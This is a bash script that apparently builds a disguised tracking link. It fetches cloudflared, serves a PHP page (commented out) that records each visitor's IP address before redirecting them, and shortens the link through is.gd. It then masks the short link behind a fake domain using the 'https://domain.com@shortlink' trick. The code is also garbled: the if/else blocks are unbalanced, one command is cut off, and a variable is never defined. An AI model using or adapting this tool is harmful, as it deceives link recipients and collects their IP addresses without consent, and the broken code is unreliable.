#!bin/bash

download(){
    url=$1
    file=$(basename $url)
    curl -skf --retry-connrefused --retry 5 --retry-delay 3 -Lo "${file}" "${url}"

    if [[ -e "$file" ]]; then
        if [[ ${file#.} = "zip" ]]; then
            unzip -qq $file -d .server
        fi

        if [[ ${file#.} = "tgz" ]]; then
            tar -zxf $file -C .server
        fi

        else
            mv -f $file .server
        fi
        
        chmod +x .server/cloudflared
        rm -rf $file

        else
            echo "Download failed"
    fi
}

ini_cloud(){
    cloud_path=$(locate cloudflared)
    cloud_path=$(dirname "$cloud_path")
    cd "$cloud_path" && rm .cld.log > /dev/null 2>&1
    if [[ $(command -v termux-chroot) ]]; then
        termux-ch
    fi
}

make_php(){
#     url=$1

#     cat <<"FIN" > ip.php
#     <?php
#     if (isset($_SERVER['HTTP_CLIENT_IP'])) {
#         $ip_address = $_SERVER['HTTP_CLIENT_IP'];
#     }

#     elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
#         $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
#     }

#     elseif (isset($_SERVER['REMOTE_ADDR'])) {
#         $ip_address = $_SERVER['REMOTE_ADDR'];
#     }

#     header("Location: $url");

#     $file = fopen("ip.txt", "a");
#     fwrite($file, "IP: " . $ip_address);
#     fclose($file);
    
#     exit();
#     ?>
#     FIN
}



if locate cloudflared > /dev/null 2>&1; then
    :
else
    echo "Downloading Cloudflared"
    mkdir .server
    arch=$(uname -m)
    if [[ ("$arch" == *"arm"*) || ("$arch" == *"Android"*) ]]; then
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"

    elif [[ "$arch" == *"aarch64"* ]]; then 
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

    elif [[ "$arch" == *"x86_64"* ]]; then
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
fi

host='127.0.0.1'
port='8080'

echo -n "Insert a valid url like 'https://anything.com': "
read msk
if [[ "$msk" != http://*.com* && "$msk" != https://*.com* ]]; then
    msk="https://$msk.com"
fi

cd .server && rm -f ip.php
make_php msk
php -S "$host":"$port" > /dev/null 2>&1
    #################### GERAR O LINK E FAZER A REQUISIÇÃO NESSE BLOCO

    req=$(curl -S https://is.gd/create.php\?format\=simple\&url\=${fkurl})
    is_gd=${req#https://}

    #####################################################################



new_url=$msk@$is_gd
echo "$new_url"